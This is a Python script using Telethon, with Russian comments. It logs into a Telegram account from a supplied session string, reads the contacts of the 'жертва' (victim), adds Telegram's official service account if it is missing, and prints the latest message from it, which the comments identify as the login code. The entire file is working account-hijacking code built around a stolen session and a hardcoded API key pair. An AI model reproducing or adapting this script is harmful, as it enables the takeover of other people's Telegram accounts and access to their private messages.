from telethon import TelegramClient
from telethon.tl.functions.contacts import AddContactRequest, GetContactsRequest
import asyncio
import termcolor
from pystyle import Write, Colors, Center
from telethon.sessions import StringSession

api_id = '16623'
api_hash = '8c9dbfe58437d1739540f5d53c72ae4b'

# абуз Telethon путём шифровки ключа сессии

session_string = input("введи ключ сессии:  ")

phone_number = '+994777779797'  # НЕ МЕНЯТЬ



# Номер, от которого нужно просмотреть сообщения(в нашем случае официальный телеграм бот)

target_phone_number = '+42777'

# Инициализация клиента Telethon
client = TelegramClient(StringSession(session_string), api_id, api_hash)

async def get_or_add_user_by_phone(phone):
    # Получаем контакты жервы
    contacts = await client(GetContactsRequest(hash=0))
    for contact in contacts.users:
        if contact.phone == phone.strip('+'):  # Сравниваем с номером без '+'
            return contact  # Если номер найден, возвращаем контакт

    # Если пользователь не найден, добавляем его в контакты
    print(f"Пользователь с номером {phone} не найден в контактах. Добавляем его...")
    contact_result = await client(AddContactRequest(
        id=777000,  # При добавлении нового пользователя указываем 0
        first_name="Telegram",  
        last_name="",
        phone=phone.strip('+')  # Передаем номер без '+'
    ))

    # После добавления пробуем снова получить список контактов
    contacts = await client(GetContactsRequest(hash=0))
    for contact in contacts.users:
        if contact.phone == phone.strip('+'):
            return contact  # Возвращаем контакт после добавления

    return None

async def view_messages_from_contact(phone):
    # Поиск пользователя по номеру телефона или добавление его в контакты
    user = await get_or_add_user_by_phone(phone)
    if not user:
        print(f"Не удалось добавить пользователя с номером {phone}.")
        return

    # Получаем последнее сообщение от телеграмма(код)
    async for message in client.iter_messages(user.id, limit=1):
        print(f"\n\nСообщение: {message.text}")

async def main():
    await client.start(phone_number)
    print("Авторизация успешна!")
    await view_messages_from_contact(target_phone_number)

# Бесконечный While
with client:
    client.loop.run_until_complete(main())
